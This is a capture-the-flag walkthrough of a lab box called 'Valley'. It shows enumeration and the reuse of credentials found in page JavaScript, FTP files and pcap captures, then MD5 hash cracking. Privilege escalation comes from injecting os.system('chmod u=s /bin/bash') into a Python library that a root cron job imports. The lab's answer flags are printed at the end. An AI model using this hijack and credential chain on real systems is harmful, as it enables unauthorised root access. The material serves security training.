# Box Name

## ValleyPE

## Overview
---
* [[#Enumeration]]
	- nmap
	- ffuf
	- web analysis
	- wireshark
* [[#Initial Foothold]]
	* ssh

* [[#Privilege Escalation]]
	* python module hijacking

---
## Enumeration

### NMAP
```bash
Nmap scan report for 10.10.213.229
Host is up, received user-set (0.13s latency).
Scanned at 2023-05-26 16:42:09 CDT for 11s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU=
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg=
|   256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky
80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
37370/tcp open  ftp     syn-ack vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

```

### FFuF
```bash
──(kn1ght㉿Kali)-[~/THM/Valleype]
└─$ ffuf -c -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt -fc 403 -recursion-depth  4 -u http://10.10.175.224/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.175.224/FUZZ
 :: Wordlist         : FUZZ: /home/scott/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

gallery                 [Status: 301, Size: 316, Words: 20, Lines: 10]
static                  [Status: 301, Size: 315, Words: 20, Lines: 10]
.                       [Status: 200, Size: 1163, Words: 176, Lines: 39]
pricing                 [Status: 301, Size: 316, Words: 20, Lines: 10]

[INFO] Starting queued job on target: http://10.10.175.224/gallery/FUZZ

[INFO] Starting queued job on target: http://10.10.175.224/static/FUZZ

.                       [Status: 200, Size: 567, Words: 43, Lines: 15]
8                       [Status: 200, Size: 7919631, Words: 0, Lines: 0]
4                       [Status: 200, Size: 7389635, Words: 0, Lines: 0]
5                       [Status: 200, Size: 1426557, Words: 4953, Lines: 5450]
9                       [Status: 200, Size: 1190575, Words: 3866, Lines: 4439]
1                       [Status: 200, Size: 2473315, Words: 10264, Lines: 10416]
11                      [Status: 200, Size: 627909, Words: 2055, Lines: 2130]
3                       [Status: 200, Size: 421858, Words: 1549, Lines: 1773]
7                       [Status: 200, Size: 5217844, Words: 20486, Lines: 19522]
12                      [Status: 200, Size: 2203486, Words: 8505, Lines: 9816]
17                      [Status: 200, Size: 3551807, Words: 12976, Lines: 13072]
2                       [Status: 200, Size: 3627113, Words: 1, Lines: 1]
6                       [Status: 200, Size: 2115495, Words: 7982, Lines: 9285]
10                      [Status: 200, Size: 2275927, Words: 1, Lines: 1]
16                      [Status: 200, Size: 2468462, Words: 9883, Lines: 9004]
18                      [Status: 200, Size: 2036137, Words: 7704, Lines: 8326]
00                      [Status: 200, Size: 127, Words: 15, Lines: 6]
15                      [Status: 200, Size: 3477315, Words: 1, Lines: 1]
13                      [Status: 200, Size: 3673497, Words: 1, Lines: 1]
14                      [Status: 200, Size: 3838999, Words: 1, Lines: 1]


[INFO] Starting queued job on target: http://10.10.175.224/pricing/FUZZ

.                       [Status: 200, Size: 1140, Words: 73, Lines: 18]
:: Progress: [43003/43003] :: Job [4/4] :: 307 req/sec :: Duration: [0:02:28] :: Errors: 0 ::


```

### WEBSITE:80
#### viewing html source code find a couple of sub folders
  - #### gallery and pricing
	
```html
<div>
				
				<p><strong>Allow Valley Photo Co. to introduce itself. We are the premire photography company to capture the perfect moments. </strong> We offer a number of samples of our previous work in a gallery which can be seen below</p>
                                
				<button onclick="window.location.href = 'gallery/gallery.html';"> View Gallery </button>
				
				<h2>We capture memories to forever hold</h2>

				<ol>
				   <li>We use top of the line equipment used by the professionals all around the globe.</li>
				   <li>Quality is of the utmost importance so if you aren't satisfied then it free.</li>
				</ol>

				<h2>We offer the lowest prices for the highest quality</h2>
                                <button onclick="window.location.href = 'pricing/pricing.html';"> View Pricing </button>

				<h3>Memory enhanced through photography.</h3>
				</div>
```

-  #### nothing much in /gallery

![[Pasted image 20230527100117.png]]

 - #### viewing /pricing
 
![[Pasted image 20230527100548.png]]


 -  #### found note.txt
 
```
J,
Please stop leaving notes randomly on the website
-RP
```

 - #### going back to the dir scan noticed a /static/00
	 - seemed to be odd 
	 
```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```
( find possible username and a new directory)



 - ### checked out the /dev1243224123123
	 #### find a login page
![[Pasted image 20230527101456.png]]

 - #### view the HTML source for /dev1243224123123
	 - find a couple .js files
	 
```html
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="[style.css](view-source:http://10.10.175.224/dev1243224123123/style.css)">
  <script defer src="[dev.js](view-source:http://10.10.175.224/dev1243224123123/dev.js)"></script>
  <script defer src="[button.js](view-source:http://10.10.175.224/dev1243224123123/button.js)"></script>
</head>
```

- #### viewed the /dev.js file and ind some creds

```js
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

 - ### used cresds to login to /dev1243224123123 
 
```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```


 - #### reused creds for ftp  login
 
```
└─$ ftp 10.10.175.224 37370 
Connected to 10.10.175.224.
220 (vsFTPd 3.0.3)
Name (10.10.175.224:scott): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||24536|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
226 Directory send OK.
```
   downloaded the pcap files
   
### WIRESHARK

 - #### using wireshark exported HTTP objects
 
![[Pasted image 20230527103252.png]]

 - #### searching through found creds in the  index(1).html file
 
```
cat files/index\(1\).html 
uname=valleyDev&psw=ph0t0s1234&remember=on
```


---
## Initial Foothold


# SSH
 - #### first tried to creds for siemDev but unsuccessful 
 - tried creds for valleyDev
 - 
```js
└─$ pwncat-cs valleyDev:ph0t0s1234@10.10.175.224
[10:41:54] Welcome to pwncat 🐈!                                                                                           __main__.py:164
[10:41:59] 10.10.175.224:22: registered new host w/ db                                                                      manager.py:957
(local) pwncat$                                                                                                                           
(remote) valleyDev@valley:/home/valleyDev$ id
uid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev)

(remote) valleyDev@valley:/home/valleyDev$ ls -la
total 24
drwxr-xr-x 5 valleyDev valleyDev 4096 Mar 13 08:17 .
drwxr-xr-x 5 root      root      4096 Mar  6 13:19 ..
-rw-r--r-- 1 root      root         0 Mar 13 09:03 .bash_history
drwx------ 3 valleyDev valleyDev 4096 Mar 20 20:02 .cache
drwx------ 4 valleyDev valleyDev 4096 Mar  6 13:18 .config
drwxr-xr-x 3 valleyDev valleyDev 4096 Mar  6 13:18 .local
-rw-rw-rw- 1 root      root        24 Mar 13 08:17 user.txt

(remote) valleyDev@valley:/home$ ls -la
total 752
drwxr-xr-x  5 root      root        4096 Mar  6 13:19 .
drwxr-xr-x 21 root      root        4096 Mar  6 15:40 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13 08:17 valleyDev

(remote) valleyDev@valley:/home$ file valleyAuthenticator 
valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header

```
   
	 downloaded the valleyAuthenticator to my local machine and ran strings on it
	 
```bash
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
/proc/self/exe

```
		
		unpacked the file with:
		
```bash
└─$ upx-ucl -d valleyAuthenticator
```
		
		ran the file localy
		
```bash
Welcome to Valley Inc. Authenticator
What is your username: siemDev
What is your password: california
Wrong Password or Username

└─$ ./valleyAuthenticator
Welcome to Valley Inc. Authenticator
What is your username: valleyDev
What is your password: ph0t0s1234
Wrong Password or Username

```

		ran strings on the unpacked file grep'd for username find possible MD5 hashes
		
```bash
└─$ strings -10 valleyAuthenticator | grep -A 10 -B 10 password
AWAVAUATUSH
H[]A\A]A^A_
H[]A\A]A^A_
AWAVAUATUSH
h[]A\A]A^A_
[]A\A]A^A_
e6722920bab2326f8217e4bf6b1b58ac <==
dd2921cc76ee3abfd2beb60709056cfb <==
Welcome to Valley Inc. Authenticator
What is your username: 
What is your password: 
Authenticated
Wrong Password or Username
basic_string::_M_construct null not valid
basic_string::_M_construct null not valid
terminate called recursively
  what():  
terminate called after throwing an instance of '
terminate called without an active exception
basic_string::append
__gnu_cxx::__concurrence_lock_error

```

		md5 hashes crack
		
```bash
└─$ hashcat -m 0 hash ~/rockyou.txt
Dictionary cache hit:
* Filename..: /home/scott/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

dd2921cc76ee3abfd2beb60709056cfb:valley                   
e6722920bab2326f8217e4bf6b1b58ac:liberty123    
```

		ssh in as valley
		
```bash
(local) pwncat$ connect valley:liberty123@10.10.175.224
[11:06:40] 10.10.175.224:22: loaded known host from db                                                                      manager.py:957
(local) pwncat$                                                                                                                           
(remote) valley@valley:/home/valley$ id
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```

		uploaded and ran pspy find root running a cron job
		
```bash
2023/05/27 09:15:32 CMD: UID=0    PID=10     | 
2023/05/27 09:15:32 CMD: UID=0    PID=1      | /sbin/init auto noprompt 
2023/05/27 09:16:01 CMD: UID=0    PID=1885   | /bin/sh -c python3 /photos/script/photosEncrypt.py 
2023/05/27 09:16:01 CMD: UID=0    PID=1884   | /usr/sbin/CRON -f 
2023/05/27 09:16:01 CMD: UID=0    PID=1886   | python3 /photos/script/photosEncrypt.py 
2023/05/27 09:16:01 CMD: UID=0    PID=1889   | /lib/systemd/systemd-udevd 

```

	checked ot the file in the cron job
	
```python
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)

```

---

## Privilege Escalation

### Python module hijacking

#### searched for  python 3.8 find valleyAdmin has perms to write in folder

```bash
(remote) valley@valley:/home/valley$ python3 -c 'import sysconfig; print(sysconfig.get_paths()["purelib"])'
/usr/lib/python3.8/site-packages
(remote) valley@valley:/home/valley$ ls -la /usr/lib/ | grep python3.8
drwxrwxr-x  30 root valleyAdmin 20480 Mar 20 07:48 python3.8
```
	
	modified base64.py
	
```python
#! /usr/bin/python3.8
-------------------------------------------------------------------
import os
os.system("chmod u=s /bin/bash")

"""Base16, Base32, Base64 (RFC 3548), Base85 and Ascii85 data encodings"""
---------------------------------------------------------------------
# Modified 04-Oct-1995 by Jack Jansen to use binascii module
# Modified 30-Dec-2003 by Barry Warsaw to add full RFC 3548 support
# Modified 22-May-2007 by Guido van Rossum to use bytes everywhere

```
	  
	then waited for root to run the cron job
	
```bash
valley@valley:/dev/shm$ ls -la /bin/bash
---Sr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash

remote) valley@valley:/home/valley$ bash -p
(remote) root@valley:/home/valley# id
uid=1000(valley) gid=1000(valley) euid=0(root) groups=1000(valley),1003(valleyAdmin)
(remote) root@valley:/home/valley# 

```
	
	grab the flags
	
```bash
(remote) root@valley:/home/valley# cat /home/valleyDev/user.txt /root/root.txt
"
THM{k@l1_1n_th3_v@lley}
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
"
```
---